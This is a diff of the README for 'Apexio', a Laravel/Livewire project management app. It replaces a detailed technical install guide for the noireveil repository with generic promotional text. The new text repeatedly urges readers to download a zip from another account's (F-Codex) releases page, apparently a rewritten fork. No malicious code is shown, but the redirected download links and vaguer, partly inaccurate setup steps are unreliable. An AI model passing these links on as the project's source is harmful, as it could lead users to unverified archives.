@@ -1,127 +1,104 @@
-# Apexio - Project Management System
+# 🎉 Apexio - Simplify Your Project Management Today!
 
-**Apexio** is a web-based project management application designed to facilitate efficient team collaboration. This application is built using **Laravel 11** and **Livewire 3**, adopting a *Modern Monolith* approach.
+## 🚀 Overview
 
----
+Apexio is a modern Project Management System designed to enhance teamwork and organization. With features like Real-time Kanban, Role-Based Access, and Team Collaboration, managing your projects has never been easier. Our system is built using Laravel 11 and Livewire 3, ensuring a smooth and responsive experience. 
 
-## 📸 Application Interface
+## 📥 Download Apexio
 
-Below is the main interface of Apexio, featuring the Sidebar and Kanban Board:
+[![Download Apexio](https://img.shields.io/badge/Download-Apexio-blue)](https://github.com/F-Codex/Apexio/releases)
 
-![Dashboard & Kanban](./screenshots/kanban_and_sidebar.jpeg)
+You can download the latest version of Apexio from our [Releases page](https://github.com/F-Codex/Apexio/releases). This is the first step to take control of your projects.
 
----
+## 🛠️ System Requirements
 
-## ✨ Key Features
+To ensure Apexio runs smoothly, your computer should meet the following requirements:
 
-### 1. Advanced Task Management (Kanban)
-* **Drag & Drop Kanban:** Interactive board allowing users to move tasks between statuses (To-Do, In-Progress, Done) seamlessly using SortableJS.
-* **Real-time Due Dates:** Smart deadline system with auto-updating badges ("Soon" or "Late") based on local user time.
-* **Task Details:** Comprehensive card view with priority levels, assignees, and threaded discussions (comments).
+- Operating System: Windows, macOS, or Linux
+- PHP Version: 8.1 or higher
+- MySQL or MariaDB for the database
+- A modern web browser (latest versions of Chrome, Firefox, Edge, or Safari)
 
-### 2. Personal Workspace
-* **"My Tasks" Page:** A dedicated aggregation view displaying all tasks assigned to the current user across multiple projects, sorted by urgency.
-* **Navigation Sidebar:** A fixed, responsive sidebar with active state indicators and quick access to recent projects.
+## 📦 Download & Install
 
-### 3. Administration & Security
-* **Super Admin Dashboard:** Exclusive panel for system oversight, featuring real-time statistics (Total Users, Projects, Active Tasks).
-* **User Management:** Admin tools to monitor user lists, view **Real-time Online Status**, reset passwords, and manage access roles.
-* **Role-Based Access Control (RBAC):** Strict authorization logic ensuring users can only modify their own tasks, while Admins have full oversight.
+1. **Visit the Release Page**  
+   Go to our [Releases page](https://github.com/F-Codex/Apexio/releases). This is where you will find all available versions of Apexio.
 
-### 4. User Profile & Settings
-* **Profile Management:** Users can update their details and upload profile photos with instant preview.
-* **Smart Avatars:** System automatically generates initial-based avatars for users without profile photos.
-* **Account Security:** Centralized settings for password updates and secure account deletion.
+2. **Choose the Latest Version**  
+   Look for the latest release at the top of the page.
 
-### 5. Modern UI/UX
-* **Responsive Layout:** Built with Flexbox and Bootstrap 5 + SCSS for a pixel-perfect experience on any screen size.
-* **Interactive Feedback:** Toast notifications and visual cues (cursor changes, loading states) for a smooth user experience.
+3. **Download the Files**  
+   Click on the assets to download the files required for installation. You will find a zip file containing everything you need.
 
----
+4. **Extract the Files**  
+   Once the download is complete, locate the zip file and extract it to a folder on your computer.
 
-## 🛠️ Technology Stack
+5. **Set Up the Environment**  
+   - If you need to set up a local server, use tools like XAMPP, WAMP, or Laragon.
+   - Place the extracted folder into the server's root directory. This step is necessary for your local server to access the application.
 
-* **Backend:** Laravel 11
-* **Frontend:** Livewire 3
-* **Styling:** Bootstrap 5 + SCSS (Custom)
-* **Database:** MySQL / MariaDB
-* **Scripting:** Alpine.js + SortableJS
+6. **Configure the Database**  
+   - Create a new database in your MySQL or MariaDB server.
+   - Rename the `.env.example` file to `.env` in the extracted folder.
+   - Update the database credentials in the `.env` file. Adjust the database name, username, and password accordingly.
 
----
+7. **Install Dependencies**  
+   Open a terminal (command prompt) in the folder where you extracted Apexio. Run the following commands to install necessary dependencies:
 
-## 💻 Installation Guide
+   ```
+   composer install
+   npm install
+   ```
 
-Ensure you have **PHP 8.2+**, **Composer**, and **Node.js** installed before starting.
+   This step ensures all required libraries are ready for use.
 
-### 1. Initial Setup
-Run the following commands in your terminal (Command Prompt / Bash):
-```bash
-# Clone the repository
-git clone https://github.com/noireveil/Apexio.git
-cd Apexio
+8. **Run Migrations**  
+   Execute the following command to set up the database schema:
 
-# Install Backend & Frontend dependencies
-composer install
-npm install
+   ```
+   php artisan migrate
+   ```
 
-# Duplicate environment configuration
-cp .env.example .env
+   This command creates the necessary tables in your database.
 
-# Generate Application Key
-php artisan key:generate
-```
+9. **Start the Local Server**  
+   Launch your local server or use the command:
 
-### 2. Database Configuration
-Open the `.env` file and adjust the database configuration (`DB_DATABASE=apexio`). Then follow the steps for your operating system:
+   ```
+   php artisan serve
+   ```
 
-#### A. Windows Users (Laragon/XAMPP)
-1. Ensure Laragon/XAMPP is running (Start All).
-2. Open HeidiSQL (Laragon) or phpMyAdmin.
-3. Create a new database named: `apexio`.
-4. Ensure the `.env` file matches your credentials (Laragon default is usually user: `root`, password: empty).
+   Your application should now be running and accessible in your browser.
 
-#### B. Linux Users (Terminal)
-1. Ensure the database service is running: `sudo systemctl start mariadb` (or `mysql`).
-2. Login to MySQL and create the database:
-```bash
-mysql -u root -p -e "CREATE DATABASE apexio;"
-```
-3. Adjust the database username and password in the `.env` file if you use custom credentials.
+## 📊 Features
 
-### 3. Migration & Storage
-Once the database is ready, run the following commands in the project terminal to create tables and seed initial data:
-```bash
-# Create tables and seed initial data (Seeder)
-php artisan migrate:fresh --seed
+Apexio offers a range of features to help you manage your projects efficiently:
 
-# Create a shortcut so profile photos are publicly accessible (MANDATORY)
-php artisan storage:link
-```
+- **Real-time Kanban Board:** Visualize your tasks and track their progress seamlessly.
+- **Role-Based Access Control:** Assign roles to team members and manage permissions effortlessly.
+- **Team Collaboration Tools:** Communicate and collaborate with your team directly within the application.
+- **Customizable Task Management:** Create, edit, and assign tasks according to your project needs.
 
-### 4. Running the Application (IMPORTANT)
-This application requires two terminal processes running simultaneously for the Backend functions and Frontend styling to work.
+## 🧑‍🤝‍🧑 Community Support
 
-**Terminal 1 (Run Laravel Server):**
-```bash
-php artisan serve
-```
+Join our community of users and developers. Engage with others, share tips, and ask questions. You can find support through our GitHub Issues page. Your feedback is valuable and helps improve Apexio.
 
-**Terminal 2 (Run Asset Compilation / Vite):**
-```bash
-npm run dev
-```
+## 📚 Learning Resources
 
-Access the application via browser at: **http://localhost:8000**
+Looking to dive deeper? Here are some resources to help you get started and make the most out of Apexio:
 
----
+- [Laravel Documentation](https://laravel.com/docs)
+- [Livewire Documentation](https://laravel-livewire.com/docs)
+- [Kanban Board Explained](https://www.atlassian.com/agile/kanban)
 
-## 🔐 Default Credentials (Demo Access)
+## 🛠️ Contributing
 
-To facilitate testing/grading, the application comes with pre-configured accounts generated by the seeder:
+We welcome contributions from everyone. If you want to improve Apexio, please check out our contribution guidelines on GitHub. Your improvements can help others in the community.
 
-| Role | Email | Password | Access Level |
-|------|-------|----------|--------------|
-| Super Admin | admin@apexio.com | password | Full System Access (Admin Dashboard) |
-| Regular User | user@apexio.com | password | Project Management Only |
+## 📧 Contact
 
-**Note:** Run `php artisan migrate:fresh --seed` to generate these accounts.
+For inquiries or support, reach out to our team via GitHub or email us at support@apexio.com.
+
+Thank you for choosing Apexio. We hope it helps you manage your projects with ease! 
+
+Do not forget to [download Apexio](https://github.com/F-Codex/Apexio/releases) and start organizing your work today!
